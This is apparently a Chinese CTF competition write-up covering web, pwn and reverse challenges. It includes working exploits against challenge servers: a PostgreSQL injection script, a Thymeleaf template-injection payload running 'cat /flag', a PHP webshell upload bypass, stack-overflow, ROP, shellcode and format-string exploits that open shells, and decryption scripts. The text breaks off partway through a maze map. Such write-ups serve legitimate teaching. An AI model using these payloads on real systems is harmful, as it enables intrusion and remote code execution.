不过确实去搜 issue 不是很常见，所以当个有意思的 trick 吧~

后面 sqli 的预期是用 `$$` 提前闭合，然后直接将查询结果写进字段里。当然有师傅用盲注，理论可行，但实际因为我放了很多干扰表，所以做题体验可能不是那么的好hhh。

exp:
```python
import json
import requests
import uuid

url = 'http://121.4.73.103:3001/u'

def force(session):
    cnt = 0
    while True:
        query = f"SELECT table_name from information_schema.tables where table_catalog='url_shorter' limit 1 offset {cnt}"
        payload = f"https://baidu.com/$$,?,'123',({query}),0,false); --"
        rng = uuid.uuid4()
        requests.post(url=url + "/st", cookies={"session": session}, json={
            "original_url": payload,
            "verify_id": str(rng)
        })
        resp = requests.post(url=url + "/info", cookies={"session": session}, json={
            "verify_id_list": [str(rng)]
        })
        print(json.loads(resp.text)['data_list'][0]['latest_visit_at'])
        cnt += 1


if __name__ == '__main__':
    rng = uuid.uuid4()
    requests.post(url=url + "/register", json=["SilentESilentESilentE", "SilentESilentESilentE", True])
    r = requests.post(url=url + "/login", json=["SilentESilentESilentE", "SilentESilentESilentE"])
    database = "current_database()"
    flag = "select fflagg from public.tH3re_1s_fl4gg limit 1 offset 0"
    payload = f"https://baidu.com/$$,?,'123',({flag}),0,false); --"
    # force(r.headers['merak'][8:])
    s = requests.post(url=url + "/st", cookies={"session": r.headers['merak'][8:]}, json={
        "original_url": payload,
        "verify_id": str(rng)
    })
    print(s.text)
    resp = requests.post(url=url + "/info", cookies={"session": r.headers['merak'][8:]}, json={
        "verify_id_list": [str(rng)]
    })
    print(json.loads(resp.text))
```

### 真真历险记

看看hint:
> <p style="display:inline">hint：建议关注</p><p style="display:inline;color:red">颜</p><p style="display:inline;color:#98c1d9">色</p>。
> 然后回到游戏里面
> ![](https://md.byr.moe/uploads/upload_d78d84b8dc26b95b325c80e0f084b81d.png)
> 此处提示去看英文缩写，颜色也和hint中的红色字体一样，那么去找找哪儿有英文缩写
> ![](https://md.byr.moe/uploads/upload_74bd32bdaaff61e31470072ddd155ee3.png)
> 就这一个地方的颜色和hint中第二个颜色一样，看看咋缩
> **C**yber**S**pace **S**ecurity -> 像不像**CSS** ？

在styles.css中能看到
![](https://md.byr.moe/uploads/upload_cfaca86a8f3ff30ddc0b120e47947554.png)
part1 - part3 三段拼起来，为jsfuck，直接放控制台就能出
![](https://md.byr.moe/uploads/upload_e1df89a31bac2038611280d55074154f.png)

> 真签到吧、、、
> 放hint之前可能有点对脑电波，放了之后都能看懂吧感觉、、、




### 寒秋送温暖

这道题没有什么难点，主要是送温暖的，bypass的方法有很多，相信很多同学主要是卡在了如何上传文件上面，这里简单提供三个方法
>1.自己创建一个html网页来做文件上传功能
>2.也是比较方便的方法，就是直接在题目界面审查元素，添加以下代码
```htmlmixed=
<form action="/" method="post" enctype="multipart/form-data">
    <div><input type="file" multiple="multiple"  name="file"></div>
    <div><input type="submit" value="上传"></div>
</form>
```
上传时会检测文件MIME是不是`image/jpg`，也比较好改，比如可以使用burp suite抓包修改绕过
>3.python脚本来上传文件。这里用到了requests库，这个库还是很有用的，大家可以关注一下
```python=
import requests

url="http://*******/"    #换成题目地址
s=requests.Session()

files = {'file': ('exp.php',open('exp.php','rb'), 'image/jpg')}
r = s.post(url,files =files)
print(r.text)
```
也只有短短几行，exp.php里面的内容就是写的php马，应该还是很好理解的（？

**关于函数的绕过：**
这里上来先ban了htaccess，其实也算是对上一道OnlyImg的提示了，这么直白，不知道OnlyImg的出题人看了会不会想暴打我（笑）

至于文件内容，则只检测了`eval`，其实可以用`system`, `assert`等多种函数替代，一些精巧的免杀马也可以，我记得好像有位师傅传了高级的异或字符串绕过，太高手了👍……


### 百里香之叶
简单题，考点是thymeleaf模板注入
``/welcome?lang=__$%7bnEw%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat /flag%22).getInputStream()).next()%7d__::.``


## PWN

### check_in
栈溢出

### ヰ世界転⽣
分别考察了`宽度溢出`和`有符号数无符号数` 转换时的溢出
![](https://md.byr.moe/uploads/upload_ace8c407d48f3def4337828da5e0a07a.png)
`point_checker` 这里对分数 `v7` 做了检查，但注意到类型是 `int8`，也就是它只会对最低的`8 bit` 做检查，便可以通过构造一个较大的数来 bypass
>  譬如我们点数是 `1025(0x401)`，检查时只会接收到它的最低的一个字节也就是 `1(0x01)` 显然小于我们的限制条件 `68`，就可以通过这个检查。

之后来到下面选择技能的方法。只有 `case 5` 和 `case 6` 是可以输入字符的，显然漏洞存在这里。
注意到 `read` 函数的字节大小是 `size_t`，也就是无符号型整数，而检查时我们的 `nbytes` 却是一个有符号型整数，且只对 `nbytes` 的上界做了判断，那么我们使用一个负数即可获得一个很大的写空间，也就存在栈溢出的漏洞。

在没有 `canary` 和 `pie` 的情况下，拥有后门 `goddess_b4ckd00r`，直接`ret2text` 修改返回地址即可

exp:
```python
from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'DEBUG'

# sh = process(['../pwn'])
sh = remote("10.21.162.184", 6657)

for _ in range(11):  # 刷钱
    sh.sendlineafter(b"Points", b'5')
sh.sendlineafter(b"Your Points", b'0')
sh.sendlineafter(b"Your Points", b'5')
sh.sendlineafter(b"Your skill name length: ", b'-1')
system_addr = 0x804984a

payload = b'A'*(0x47+0x04) + p32(system_addr)
sh.sendlineafter(b"name:", payload)
sh.sendlineafter(b"Points", b'0')
sh.interactive()
```

### ret2shellcode
seccomp-tools查看，限制了execve，⽆法使⽤常规的shellcode get shell，使⽤orw(open → read → write)读取flag
![](https://md.byr.moe/uploads/upload_c297f9378112c6ff745cf44ce7e8cbe2.png)

exp:
```python
from pwn import *
context(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
p = remote('10.21.162.184',6660)
# p = process("./ret2shellcode")
shellcode = asm('''
push 0x67616c66
mov rdi,rsp
xor esi,esi
push 2
pop rax
syscall
mov rdi,rax
mov rsi,rsp
mov edx,0x30
xor eax,eax
syscall
mov edi,1
mov rsi,rsp
push 1
pop rax
syscall
''')
p.sendlineafter("letter:",shellcode)
payload = b'a'*0x38+p64(0x00233000)
p.sendlineafter("you!",payload)
p.interactive()
```
### ASCII_ART
考察 `PIE` 的特点。 `PIE` 随机化，低 `12bit` 是不会变的。
代码可能难读一点，但稍微动调试试就知道实际上它储存了一个函数指针，并加上随机的偏移（0~4）并运行来决定字符画罢了。
同时观察代码可以发现有一个后门函数调用了`system("/bin/sh");`（因为没有引用所以 IDA 没有识别出来）
![](https://md.byr.moe/uploads/upload_4d81fc896b9fddd2c6d8a93bcb44fa45.png)

`read` 函数存在明显的栈溢出，我们可以通过覆写最低的两个字节来修改执行函数的低 `16bit` ，因为 `PIE` 的低 `12bit` 不会改变，所以也就相当于爆破 `4bit` ，在可接受范围内。
没成功的话多打几次就好了

exp:
```python
from pwn import *
context.log_level = 'DEBUG'

# sh = process(['./test'])
sh = remote("10.21.162.184", 6658)

sh.send(b'\x00'*0x10 + b'\x40\x14')  # 注意是小端序

sh.interactive()
```

### Another_Checkin_Pwn
非预期：使用 `$1%s` 就可以直接把字符串 dump 出来，因为程序把这个字符串存到了 `rsi` 寄存器用于 `strcmp`，然后之后 `rsi` 寄存器没有再变化过（出题的时候应该把 `rsi` 寄存器清空）所以第一个(或者说第二个)参数就是这个字符串

格式化字符串盲打，网上偷个脚本把程序 `0x40000000~0x43000000` dump 下来直接丢 IDA 里就看的懂了
~~但是我要批评有些人抄的那个脚本，开了连接不关的，吃个饭回来有 2w+ 个连接，CPU 在哭泣~~

源码:
```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

int main()
{
    setbuf(stdin, 0LL);
    setbuf(stdout, 0LL);
    setbuf(stderr, 0LL);
    char s[0x100];

    memset(s,0,0x100);
    while(1)
    {
        read(0,s,0x50);
        if(!strcmp(s, "D0nt~Y0u_l1k3_fmt_string_4s_I_d0?\n")) {
            printf("YES, format string is so funnnnnnnn!\n");
            system("/bin/sh");
            break;
        }
        printf(s);
    }
    return 0;
}
```

exp:
```python
from pwn import *

# sh = process(['./pwn'])
sh = remote("10.21.162.184", 6659)

base = 0x400000
data = 0x600000

context.log_level = 'DEBUG'
context.arch = 'amd64'

TEXT = b''

# sh.sendline(b"D0nt~Y0u_l1k3_fmt_string_4s_I_d0?")
# sh.interactive()
# quit(0)

while True:
    print(len(TEXT))
    print(hex(base))
    if 0x403000 <= base < data:
        break
    sh.sendline(b"LEAK---->%8$s|*|" + p64(base))
    sh.recvuntil(b"LEAK---->")
    s = sh.recvuntil(b'|*|', drop=True)
    TEXT += s
    base += len(s)
    if len(s) == 0:
        TEXT += b'\x00'
        base += 1
    if base >= 0x601000:
        break
print("leak", len(TEXT), "bytes successfully")
with open('dumpfile', 'wb') as f:
    f.write(TEXT)
```
### large apple
是想出个堆防ak的 让研一哥秒了
大概是这样
uaf，size为0x400-0x500，有沙箱，使用largebin attack，可以考虑使用house of apple，这里利用_IO_wfile_underflow攻击_IO_list_all后伪造_IO_FILE，之后利用gadget来改变rdx从而使用setcontext+61来布置寄存器最后使用orw来得到flag（后面还有一次largebin attack是为了覆盖size为堆地址）
预期解exp:
https://pastebin.com/FSRSzzcD
blankJ的解法：
seccomp-tools查看禁⽤了execve系统调⽤，使⽤orw,申请堆块⼤⼩范围(0x401,0x4ff)，destory没有清空heap_array和heap_size,存在UAF,
可以使⽤unsortedbin泄漏Libc地址，⽤tcache泄漏堆地址，并任意写，orw使⽤的是setcontext的gadget
https://pastebin.com/HXcJW9wh

### Easy shellcode

沙箱如下（shabi出题人一开始弄错了我知道了=-=）

![](https://md.byr.moe/uploads/upload_b4a1f99fc2089420fbcfaca287d972a7.png)

主要想考察一下手写shellcode的能力，程序自动把flag加载到内存中，预期解是通过rip获取到部分地址，然后逐页(0x1000)搜索字符串，遍历地址并执行输出，如果该地址不可读返回值为负数，从而通过rax判断指向的地址是否可读，如果可读则继续判断是否字符串以TSCT开头，如果是则使用`writev`打印出来，否则继续遍历地址查找。

后来提示ubuntu20后难度小了很多，因为已知环境后mmap随机分配出来的两块地址之间的偏移是固定的，可以直接计算出来

```python
from pwn import*
context(os='linux', arch='amd64', log_level='debug')

r = process('./sc')

sc = """
lea rsp, [rip+0x500]
lea r13, [rip]
mov r14, 0xfffffff00000
and r13, r14
loop:
	add r13, 0x1000
	pop r14;
	pop r14;
	push 0x1
	push r13
	mov rdi, 2
	mov rsi, rsp
	mov rdx, 1
	mov rcx, 0
	mov rax, 20
	syscall
	cmp rax, 0
	jl loop
mov rdi, [r13]
cmp edi, 0x54435354
jnz loop
push 31
push r13
mov rdi, 2
mov rsi, rsp
mov rdx, 1
mov rcx, 0
mov rax, 20
syscall
jmp $
"""
sleep(0.5)
r.send(asm(sc))
r.interactive()
```



### GoAndWriteOnHisThigh
Golang 的 pwn 题，基本上是模板题。难点就在于要知道 Go 变量什么时候分配在栈上（[详见](https://blog.cyeam.com/golang/2017/02/08/go-optimize-slice-pool#%E5%A0%86%E8%BF%98%E6%98%AF%E6%A0%88)），以及反编译是真的难读。

`IDAGolangHelper` 我没使用出来的也是有符号表的，大概是 `IDA` 更新了吧，也可以试试。([Github](https://github.com/sibears/IDAGolangHelper))
`main_run` 实际上只是实现了几个人位置的随机变化。
`main_catch` 则是对你的输入和几个人位置做对比，如果中了就可以在他们大腿内侧写字。
这里注意的就是几个人分配的方式不同。其他人都是使用的 `buf_size` 这个变量的 `0x20` 字节生成的 `buf`，而只有 `ibukifalling` 用的是硬编码的 `0x20`，根据上面那个文章，只有 `ibukifalling` 的 `buf` 会保存在栈上。
![其他人的 buf 读取](https://md.byr.moe/uploads/upload_42f4080a2405f9d413687a6270e1c0df.png)


![f0 的 buf 读取](https://md.byr.moe/uploads/upload_838ea9666a473bb74a1fbca7c41e7e56.png)

漏洞点是比较明显的，在 `main_memcpy` 中将读取的内容读到了 `buf` 上，但是 `buf` 就那么大，明显存在栈溢出漏洞
![](https://md.byr.moe/uploads/upload_2ac7a19a5a6a96254ac14a8c80f36435.png)
然而实际测试后发现如果你放入很长的字符串，会把 `buf` 的那个结构体也覆盖了导致错误，因此，需要在 `buf` 结构体对应的 `array` 位置放上一个合法的地址。那么现在的问题就是怎么调。
在没开 `PIE` 的这题里还是比较容易的，如果开了 `ASLR` 的话估计就会麻烦很多了，可能得关闭本机的 `ASLR` 随机化才容易调。

为了方便调试，我们首先写好 `ibukifalling` 的抓捕代码（笑
```python
def play():
    while True:
        sh.sendlineafter(b"example: \"1 1\"\n", b"1 1")
        text_ = sh.recvline()
        # print(text_)
        if b"You caught" in text_:
            if b"ibukifalling" in text_:
                break
            else:
                sh.sendline(b"a")

```

来到 `memcpy` 函数，在目标写入位置打上断点。
![](https://md.byr.moe/uploads/upload_46f08cb3219b18f1d76daab8020cf2aa.png)
同样的在 `buf` 结构体这里打上断点
![](https://md.byr.moe/uploads/upload_6afd458732b272080b5dc2d60b7998d6.png)
还有返回地址这里也打上断点
![](https://md.byr.moe/uploads/upload_d2aa7023f35b7a204449ebaf7dffd71d.png)

类似这样的，可以断在我们想要的位置。
```python
gdb.attach(sh, 'b *0x402010')
pause(3)

play()
```
![](https://md.byr.moe/uploads/upload_bc4dcf92094396e1bc3efd024d6709b3.png)
这便是我们要放置合法地址的位置。同样的，可以获取其他两个重要位置的地址：
```python
# buf: 0xc820043bb0  buf.array: 0xc820043e18  ret_addr: 0xc820043f40
```
合法地址放什么呢？ Go 中栈的地址是固定的，我们随便丢一个上去就好了。
```python
payload = b'A'*0x268 + p64(0xc820000000) + p64(0x200) + p64(0x200) + b'B'*0x110
```
之后就是普通的 64位 ROP 的过程了，在这里，我用一个 `mov    [rdi], rax;retn;` 的寄存器把 `/bin/sh` 写到 bss 上。

最终 exp:
```python
from pwn import *

context.log_level = 'DEBUG'

# sh = process(['./go_build_main_go'])
sh = remote("10.21.162.184", 6623)


def play():
    while True:
        sh.sendlineafter(b"example: \"1 1\"\n", b"1 1")
        text_ = sh.recvline()
        # print(text)
        if b"You caught" in text_:
            if b"ibukifalling" in text_:
                break
            else:
                sh.sendline(b"a")


pop_rax_addr = 0x403c2a  # pop rax; retn;
bss_addr = 0x5a9e20 + 0x50
pop_rdi_addr = 0x48b111  # pop rdi; or byte ptr [rax + 0x39], cl; retn;
pop_rdx_addr = 0x47da1c  # pop rdx; or byte ptr [rax - 0x77], cl; retn;
pop_rsi_addr = 0x444f84  # pop rsi; add al, 0x83; retn;
mov_rdi_rax_addr = 0x0458939  # mov qword ptr [rdi], rax; retn;

syscall_addr = 0x458d29

# gdb.attach(sh, 'b *0x401F5E')
# pause(3)

play()

# sh.sendlineafter(b">", b"A"*0x300)
payload = b'A'*0x268 + p64(0xc820000000) + p64(0x200) + p64(0x200) + b'B'*0x110
payload += p64(pop_rax_addr) + p64(bss_addr) + p64(pop_rdi_addr) + p64(bss_addr) + p64(pop_rax_addr) + b'/bin/sh\x00' + p64(mov_rdi_rax_addr)
payload += p64(pop_rax_addr) + p64(bss_addr) + p64(pop_rdx_addr) + p64(0) + p64(pop_rsi_addr) + p64(0) + p64(pop_rax_addr) + p64(0x3b) + p64(syscall_addr)
sh.sendlineafter(b">>", payload)
# buf: 0xc820043bb0  buf.array: 0xc820043e18  ret_addr: 0xc820043f40

sh.interactive()

```

## RE

### baby_xor

#### 0x01 预期解

十分简单的签到题，逻辑就是简单异或加密。解出来的人数也十分对得上人口普查器的描述。

有一个小坑点：`enflag[25]`的值是 0 ，如果直接从 ida 上静态复制的话会发现 flag 少了一位，在 flag 的提交记录中可以发现有的师傅踩了这个坑而且十分遗憾地没有更正。

```python
a = [18, 20, 7, 17, 4, 110, 10, 58, 25, 124, 32, 14, 122, 6, 123, 22, 100, 8, 6, 48, 4, 22, 34, 117, 27, 0, 36, 18, 40, 4, 105, 42, 57, 67, 43, 85, 13, 60, 5, 83, 19]

for i in range(41):
    a[i] = i ^ a[i] ^ 0x46
    print(chr(a[i]), end = "")
```

### baby_upx

第一个版本的附件是 vs 编译版本的，这个版本的附件在脱壳后的代码逻辑十分易懂，但有很多师傅反映没有装 vs ，缺少 dll 无法运行，并且不想让 vs 强暴自己的 C 盘，于是更新了第二版附件。这一版的附件脱壳后代码逻辑就显得不那么清晰了。

#### 0x00 一个trick

脱壳方面，这里有一个本来是 Jameshoi 用在 upx_revenge 上的trick，但 Linux 下好像没用了，就放这个题上面了

> 由于最新版upx解压含有随机基址功能的exe时，会导致解压后的exe无法运行，但仍然可以进行静态分析。
>
> 若需要动态调试，可以将脱壳前的exe的随机基址功能关闭，再进行脱壳；又或者直接利用软件进行调试断点。

可以考虑用 Study PE 或者 010 Editor 工具来关闭随机基址

![](https://md.byr.moe/uploads/upload_18345f581d55a3045d89a3c21b380312.png)


#### 0x01 脱壳

然后是脱壳环节，我们可以使用 exeinfo 来检查相关信息
![](https://md.byr.moe/uploads/upload_e8b429fbfe2bc58ac059817d269a0778.png)


可以发现，查壳的地方有 Don't try: upx.exe -d，并且前面的[ ]没有识别出特征值。这是因为出题人把 upx 的某些特征抹的差不多了，工具脱壳是无效的，只能选择手动脱壳。

手动脱壳部分，可以参考博客：https://www.52pojie.cn/thread-1534675-1-1.html，大致过程是一模一样的，不再赘述。

#### 0x02 代码逻辑分析

脱壳完成后，开始分析程序逻辑。
![](https://md.byr.moe/uploads/upload_7a138ca98f5addb380f9881884ddce94.png)

可以发现，v4 是输入的长度，qword_7FF68AE37750 是输入的 flag ，用 v3 承接了对 qword_7FF68AE37750[v5] 的一大坨位运算操作，并且最后与 qword_7FF68AE34480[v5] 进行比较。当进行了 32 次比较后，会进入一个 check，也就是 sub_7FF68AE31B60，这个 check 实际上是一个 MD5 校验，比对成功会提示 flag 正确。

现在的问题来到如何解决这一堆位运算。非常容易想到的思路是：既然只有 32 位，我们是否可以通过强行爆破来寻找每一种可能的值。

```python
a = [0xAF, 0xAC, 0xEC, 0xAF, 0xE7, 0x159, 0xDE, 0x1FC, 0x16F, 0x1ED, 0x1EC, 0x1DE, 0xB5, 0x16F, 0xB5, 0xEE, 0xE8, 0xEE, 0x1FC, 0xB5, 0xAD, 0xAE, 0x1FE, 0xB5, 0x1EE, 0x1EE, 0x16E, 0x17E, 0xDF, 0x16C, 0x1D9, 0x1FD]

def enc(x):
    return ((x & 32) << 3 | (x & 21) >> 2 | (x ^ 5) << 1 | (~x & 91) << 2)

for i in a:
    for j in range(32, 129):
        if enc(j) == i:
            print(chr(j), end = "")
    print("")
```

这样可以得到

```
T
QS
C
T
F
-
HJ
y{
$4
u
cqs
hj
_
$4
_
@B
A
@B
y{
_
U
PR
xz
_
`bpr
`bpr
 "02
8:
L
#13
m
}
```

随后可以先手动整理一下，然后将可能的 flag 输入进 ida 动调进行校验。这样已经可以最终确定flag为 TSCTF-J{$uch_4_BABy_UPx_pr08L3m}

#### 0x03 自动爆破

如果不想手动整理，这里分享一种通过 dfs 进行自动校验的做法，大概跑个十几秒就出来了：

```python
import subprocess
import sys

enflag = ['T', 'S', 'C', 'T', 'F', '-', 'J', '{', '$4', 'u', 'cqs', 'hj', '_', '$4', '_', '@B', 'A', '@B', 'y', '_', 'U', 'P', 'x', '_', '`bpr', '`bpr', '"02', '8:', 'L', '#13', 'm', '}']

def dfs(dep, flag):
    if dep == 32:

        file = "F:\\Desktop\\CTF\\Problems\\出题\\TSCTF-J 2022\\Reverse\\iPlayForSG - baby_upx\\baby_upx_upx_version.exe"

        p = subprocess.Popen([file], stdin = subprocess.PIPE, stdout = subprocess.PIPE)

        p.stdin.write(flag.encode())
        p.stdin.close()

        result = p.stdout.read()
        p.stdout.close()

        if b'YOU ARE GENIUS!!!' in result:
            print(flag)
            sys.exit(0)

    else:
        for i in enflag[dep]:
            dfs(dep + 1, flag + i)

dfs(0, '')
```
### byte_code

字节码嗯逆，源码如下，合理运用搜索引擎+亿点点耐心都能做出本题

```python
a = [114, 101, 118, 101, 114, 115, 101, 95, 116, 104, 101, 95, 98, 121, 116, 101]
b = [99, 111, 100, 101, 95, 116, 111, 95, 103, 101, 116, 95, 102, 108, 97, 103]
e = [80, 115, 193, 24, 226, 237, 202, 212, 126, 46, 205, 208, 215, 135, 228, 199, 63, 159, 117, 52, 254, 247, 0, 133, 163, 248, 47, 115, 109, 248, 236, 68]
pos = [9, 6, 15, 10, 1, 0, 11, 7, 4, 12, 5, 3, 8, 2, 14, 13]
d = [335833164, 1155265242, 627920619, 1951749419, 1931742276, 856821608, 489891514, 366025591, 1256805508, 1106091325, 128288025, 234430359, 314915121, 249627427, 207058976, 1573143998, 1443233295, 245654538, 1628003955, 220633541, 1412601456, 1029130440, 1556565611, 1644777223, 853364248, 58316711, 734735924, 1745226113, 1441619500, 1426836945, 500084794, 1534413607]
if __name__ == '__main__':
    c = a + b
    for i in range(31):
        print(chr(c[i]), end = "")
    print(chr(c[31]))
    for i in range(16):
        a[i] = (a[i] + d[i]) ^ b[pos[i]]
    for i in range(16):
        b[i] = b[i] ^ a[pos[i]]
    c = a + b
    for i in range(32):
        c[i] = (c[i] * d[i]) % 256
        c[i] ^= e[i]
        print(chr(c[i]), end = "")
```

逆出来运行即可获得flag`TSCTF-J{bY7ecoDe_I$_nOT_so_HArd}`




### baby_key

ELF文件，在Linux打开，让输入密码

![](https://md.byr.moe/uploads/upload_72720bde45766f6a9ae5ae1c7cc5bf0c.png)


用ida打开，scanf语句后面是`sub_11B8`函数，点进去发现是一个switch_case语句
![](https://md.byr.moe/uploads/upload_56ad6f2c8ef36906eed72cc535332cf3.png)

根据memcmp函数可以知道密码长度为16位，爆破或者观察一下，构造出正确的opcode使得byte_4060和s2相同即可。

构造出来是一个倒装句：`sO*h4hdsOm3!!sg!`，输入以后提示`PASSWORD CORRECT`说明密码正确

![](https://md.byr.moe/uploads/upload_4f2c0cbb3706cf7104353a631541fc99.png)


然后进入加密函数部分，`sub_15F0`点进去一看是一个TEA加密算法，密文是`byte_40C0`，flag长度是44位且为TSCTF-J包裹。密钥就是我们之前输入的password，每四个char转化为一个unsigned int 32，得到4位密钥，**注意密钥不是`['s', 'O', '*', 'h']`**，哪个小可爱写成这个的可以再看看代码。

注意这里，在比对结果之前把小端序改成了大端序

![](https://md.byr.moe/uploads/upload_ab3b63717933fd2a09a43b3af233bcd4.png)


爽上解密脚本，然后就错辣。

原因是`__attribute__((constructor()))`函数可以在main函数之前运行，偷偷修改了enflag的值，查看**交叉引用**或者**动调**即可获得正确的enflag

![](https://md.byr.moe/uploads/upload_f72825c8ebac63bc3d23d3ce75119398.png)


放上exp:

```cpp
#include <iostream>
#include <cstdio>
#include <stdint.h>
using namespace std;

char opcode[20] = "sO*h4hdsOm3!!sg!";
uint32_t key[4];

unsigned char enc[] =
{
	0x2f, 0x33, 0x20, 0x70, 0xac, 0x7e, 0x89, 0x4, 0xca, 0xd2, 0xfb, 0x3, 0x51, 0x8c, 0x80, 0x23, 0x69, 0xe0, 0xc0, 0xe5, 0x41, 0x62, 0xf2, 0x26, 0xb8, 0x87, 0xa4, 0x33, 0xfb, 0x7a, 0x29, 0xe4, 0x45, 0x20, 0x3c, 0x2a, 0xfe, 0x2c, 0xec, 0x18, 0xf3, 0x2, 0x1, 0xe, 0x99, 0x3b, 0x7, 0x21
};

uint32_t data[11];

void decrypt(uint32_t *v, uint32_t *key)
{
	uint32_t l = v[0], r = v[1], sum = 0, delta = 1640531527;
	sum = - delta * 32;
	for (int i = 1; i <= 32; ++i)
	{
		r -= ((l << 4) + key[2]) ^ (l + sum) ^ ((l >> 5) + key[3]);
		l -= ((r << 4) + key[0]) ^ (r + sum) ^ ((r >> 5) + key[1]);
		sum += delta;
	}
	v[0] = l, v[1] = r;
}

int main()
{
	for(int i = 0; i < 4; i++) key[i] = *(uint32_t*)&opcode[i * 4]; 
	for(int i = 0; i < 11; i++)data[i] = *(uint32_t*)&enc[4 * i];
	for(int i = 0; i < 48; i++)
	{
		enc[i] ^= 0x27;
	}
	for(int i = 0; i < 48; i += 4)swap(enc[i], enc[i + 3]), swap(enc[i + 1], enc[i + 2]);
	for(int i = 10; i >= 0; i--)
	{
    	decrypt((uint32_t*)&enc[4 * i], key);
    }
    cout << enc;
    return 0;  
}  
```

运行得到flag`TSCTF-J{T1ny_eNcryPtIoN_4LgOrIthm_Is_so_FUn}`



### Link_Game

#### 0x01 获取相关信息

（如果在你的电脑跑的动的话）先随便玩一下这个游戏，然后会发现一个弹窗：

![](https://md.byr.moe/uploads/upload_20007cb6d6539eaea938bce412e1eaaa.png)

有的师傅在这里考虑使用了 Cheat Engine 进行数据修改

![](https://md.byr.moe/uploads/upload_7ebfbd24fef499b0113212a81781273c.png)

但是，会产生如下弹窗：

![](https://md.byr.moe/uploads/upload_24bc4327fafc18bd89539bb3e4e0f7e8.png)

说明这次这个题的出题人不是很想让你直接用 CE 解题，那么只能考虑对程序进行逆向了。

#### 0x02 逆向过程

用 exeinfo 可以得知该程序是 C# 编写的

![](https://md.byr.moe/uploads/upload_383230c834789839d0218161ac8e8d34.png)

可以考虑使用 Dnspy 来对C#进行逆向，该工具十分强大，甚至可以在反编译后直接将代码导入 VS 的工程，十分方便。

可以发现，程序内大量使用了 base64 对文本进行简单加密，经过尝试，可以发现`Last_Dance()`下的文本为

![](https://md.byr.moe/uploads/upload_cc2665a4068abb48893201d64278526e.png)

可以猜测这里就是最终 flag 的比对处。

![](https://md.byr.moe/uploads/upload_eef2a8be98224ddec98ca1e7d093dbca.png)

#### 0x03 解密

对其逆向即可。首先预处理密钥数组 k 的状态，然后根据异或可逆进行逆向即可。

```cpp
#include <iostream>
#include <cstdio>
using namespace std;
int enc[] = {53, 71, 22, 108, 73, 97, 59, 107, 63, 126, 103, 125, 106, 80, 98, 66, 83, 93, 75, 2, 94, 96, 91, 48};
int k[] = {71, 65, 77, 51};

int main()
{
	for (int i = 0; i <= 20; i++)
	{
		int num6 = k[0];
		k[0] = k[1];
		k[1] = k[2];
		k[2] = k[3];
		k[3] = num6;
	}	
	for (int i = 20; i >= 0; i--)
	{
		int num6 = k[3];
		k[3] = k[2];
		k[2] = k[1];
		k[1] = k[0];
		k[0] = num6;
		int num3 = (enc[i + 3] ^ k[3]);
		int num2 = (enc[i + 2] ^ k[2]);
		int num5 = (enc[i + 1] ^ (k[1] + (num3 >> 4) & 0x67));
		int num4 = (enc[i] ^ (k[0] + (num2 >> 3) & 0x45));
		enc[i + 3] = num5;
		enc[i + 2] = num4;
		enc[i + 1] = num3;
		enc[i] = num2;
	}
	cout << "TSCTF-J{";
	for (int i = 0; i < 24; ++i) printf("%c", enc[i]);
	cout << "}";
}
```

### ez_maze

#### 0x01 简单的预期解

本题是添加了虚假控制流混淆的迷宫题，最初的预期解就是靠获得地图后猜测程序在干什么，也是想告诉大家：Reverse 方向很多时候需要猜想 & 尝试，而不是一直盯着代码嗯逆。

很喜欢 tipsy 学长的一句话：

![](https://md.byr.moe/uploads/upload_382300417c3e73a94298ecfccd854408.png)

在大概看过代码逻辑后，来到字符串窗口
![](https://md.byr.moe/uploads/upload_a823bda13c2284f62741abcf80e572c2.png)

可以猜测最下面那一大串是迷宫，简单整理一下就能拿到迷宫地图，然后可以考虑手走，也可以考虑写个搜索

```cpp
#include <bits/stdc++.h>
using namespace std;
char mp[233][233] = 
{
"+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+", 
"|SS   |        |                                         |           |                 |  |", 
"+  +  +  +--+  +  +--+--+  +  +--+--+--+--+  +--+--+--+--+  +--+  +  +--+  +  +--+--+  +  +", 
"|  |        |     |  |     |  |        |     |        |     |  |  |     |  |  |     |     |", 
"+--+--+--+  +--+--+  +  +  +--+  +--+  +--+  +  +--+  +  +--+  +  +--+  +--+  +--+  +--+  +", 
"|     |     |        |  |  |     |  |     |  |  |     |  |     |     |  |     |        |  |", 
"+  +  +--+  +--+--+  +  +--+  +--+  +--+  +--+  +  +  +  +  +--+--+  +  +  +--+  +  +--+  +", 
"|  |     |        |  |  |     |     |  |        |  |  |  |        |  |     |     |  |     |", 
"+  +--+  +--+--+  +  +  +  +--+  +  +  +--+--+--+  +  +  +--+  +--+  +--+--+  +--+  +  +--+", 
"|     |  |        |  |  |        |  |     |     |  |  |     |     |     |        |  |  |  |", 
"+--+  +  +--+  +--+  +  +--+--+--+  +  +  +  +  +  +--+--+  +--+  +--+  +--+  +  +--+  +  +", 
"|     |     |  |     |           |  |  |  |  |  |                 |  |     |  |     |  |  |", 
"+  +--+--+  +  +  +  +--+--+  +  +  +  +  +  +--+--+--+  +--+--+  +  +--+  +--+  +  +  +  +", 
"|     |  |  |     |        |  |  |  |  |     |        |  |     |  |     |     |  |  |     |", 
"+--+  +  +  +--+--+--+--+  +  +--+  +  +--+--+  +--+  +--+  +  +  +  +  +--+  +--+  +--+  +", 
"|        |     |           |     |     |        |     |     |  |     |     |  |     |     |", 
"+  +--+--+--+  +  +--+--+--+--+  +--+  +  +--+--+  +--+  +--+  +--+--+--+--+  +  +--+  +--+", 
"|     |        |           |  |  |     |  |     |  |     |                    |        |  |", 
"+--+  +  +--+--+--+--+--+  +  +  +  +--+  +  +--+  +  +--+--+--+--+--+  +--+--+--+  +--+  +", 
"|     |  |              |     |     |     |        |     |        |     |        |        |", 
"+  +--+  +  +--+  +  +--+--+  +--+--+  +--+  +--+--+--+  +  +--+  +--+--+  +--+  +  +--+--+", 
"|  |     |  |  |  |  |        |     |     |     |     |     |  |           |     |  |     |", 
"+  +  +--+  +  +  +  +  +--+--+  +  +--+  +--+  +  +  +  +--+  +--+--+  +--+  +--+  +  +  +", 
"|  |     |  |  |  |  |  |        |  |     |  |     |  |  |     |     |     |     |  |  |  |", 
"+  +--+  +  +  +  +--+  +  +--+--+  +  +--+  +--+--+  +  +--+  +  +  +--+--+--+  +--+  +  +", 
